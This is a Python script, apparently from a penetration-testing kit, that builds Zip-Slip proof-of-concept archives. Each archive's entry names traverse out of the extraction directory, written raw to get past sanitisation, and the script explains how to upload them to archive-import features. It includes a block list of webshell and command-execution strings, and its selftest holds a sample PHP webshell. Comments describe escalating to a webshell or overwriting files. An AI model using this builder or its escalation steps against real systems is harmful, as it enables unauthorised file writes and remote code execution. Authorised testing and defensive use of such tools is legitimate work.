#!/usr/bin/env python3
"""
zipslip_build.py - benign Zip-Slip PoC archive builder.
Creates a zip (or tar) containing an entry whose NAME traverses out of the extraction directory, with harmless
marker content. Upload it to an archive-extraction sink (import ZIP / restore / theme-install) and check whether
the marker lands OUTSIDE the extraction dir - that proves the extractor doesn't confine entry paths (Zip-Slip).

SAFE BY DESIGN: this tool refuses to embed executable content (no <?php, <%, <script>, #! etc.). Prove the ESCAPE
with a benign marker to a safe path first, then DESCRIBE the webshell/overwrite escalation - only drop a live shell
on YOUR OWN test instance (PATH_TRAVERSAL_TESTING_GUIDE.md section 12/20). Authorized testing only.

Usage:
  python3 zipslip_build.py --out evil.zip --name "../../../../tmp/pt-poc-9f3a1.txt" --content "zip-slip PoC benign"
  python3 zipslip_build.py --out evil.tar --format tar --name "../../../../tmp/pt-poc-9f3a1.txt" --content benign
  python3 zipslip_build.py --selftest
"""
import argparse, sys, zipfile, tarfile, io, os, tempfile

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

# refuse to build weaponized archives - keep this a PoC-only tool
BANNED = ["<?php", "<?=", "<%", "<script", "#!/", "#! /", "eval(", "system(", "exec(",
          "passthru(", "shell_exec", "base64_decode(", "subprocess", "os.system"]


def is_traversing(name):
    n = name.replace("\\", "/")
    return n.startswith("/") or ".." in n.split("/") or (len(name) > 1 and name[1] == ":")


def check_content(content):
    low = content.lower()
    for b in BANNED:
        if b in low:
            sys.exit(f"[refused] content looks like a payload ({b!r}). This tool builds BENIGN PoC archives only.\n"
                     f"          Prove the ESCAPE with a harmless marker, then describe the RCE (guide sec 12/20).")


def build_zip(out, name, content):
    # write the entry name RAW so the traversal survives (ZipInfo bypasses path sanitization)
    zi = zipfile.ZipInfo(filename=name)
    zi.external_attr = 0o644 << 16
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(zi, content)


def build_tar(out, name, content):
    data = content.encode("utf-8")
    ti = tarfile.TarInfo(name=name)
    ti.size = len(data)
    with tarfile.open(out, "w") as t:
        t.addfile(ti, io.BytesIO(data))


def selftest():
    ok = True
    # 1) builds a zip with a traversing entry name preserved
    tmp = tempfile.mkdtemp()
    zpath = os.path.join(tmp, "t.zip")
    build_zip(zpath, "../../../../tmp/pt-poc-test.txt", "benign marker")
    with zipfile.ZipFile(zpath) as z:
        names = z.namelist()
    got = names and ".." in names[0]
    print(f"[{'PASS' if got else 'FAIL'}] zip entry name preserved with traversal: {names}")
    ok = ok and got
    # 2) is_traversing detects the cases
    cases = [("../../x", True), ("/etc/passwd", True), ("C:\\x", True), ("safe/file.txt", False)]
    for n, exp in cases:
        r = is_traversing(n)
        flag = r == exp
        ok = ok and flag
        print(f"[{'PASS' if flag else 'FAIL'}] is_traversing({n!r}) = {r}")
    # 3) banned content is refused (simulate by direct check)
    banned_hit = any(b in "<?php system($_GET[c]); ?>".lower() for b in BANNED)
    print(f"[{'PASS' if banned_hit else 'FAIL'}] banned-content detector flags a php webshell")
    ok = ok and banned_hit
    print(f"\nSELFTEST: {'PASS' if ok else 'FAIL'}")
    return ok


def main():
    ap = argparse.ArgumentParser(description="Benign Zip-Slip PoC archive builder (authorized).")
    ap.add_argument("--out", help="output archive path, e.g. evil.zip")
    ap.add_argument("--name", help="traversing entry name, e.g. ../../../../tmp/pt-poc-<rand>.txt")
    ap.add_argument("--content", default="zip-slip PoC (benign marker) - authorized test",
                    help="benign file content (executable payloads are refused)")
    ap.add_argument("--format", choices=["zip", "tar"], default="zip")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()

    if a.selftest:
        sys.exit(0 if selftest() else 1)
    if not a.out or not a.name:
        ap.error("provide --out and --name (or --selftest)")

    check_content(a.content)
    if not is_traversing(a.name):
        print(f"[warn] entry name {a.name!r} does NOT traverse - it won't escape the extraction dir. "
              f"Add ../ or use an absolute path.")

    if a.format == "zip":
        build_zip(a.out, a.name, a.content)
    else:
        build_tar(a.out, a.name, a.content)

    print(f"[+] built {a.format} -> {a.out}")
    print(f"    entry name : {a.name}")
    print(f"    content    : {a.content!r} (benign)")
    print(f"    traverses  : {is_traversing(a.name)}")
    print("\nNext: upload to the extraction sink, then check whether the marker landed OUTSIDE the extraction dir")
    print("(e.g. the path in the entry name). If it did -> Zip-Slip confirmed. Describe the webshell escalation;")
    print("drop a live shell only on your OWN instance; never overwrite real files on prod (guide sec 12/20).")


if __name__ == "__main__":
    main()
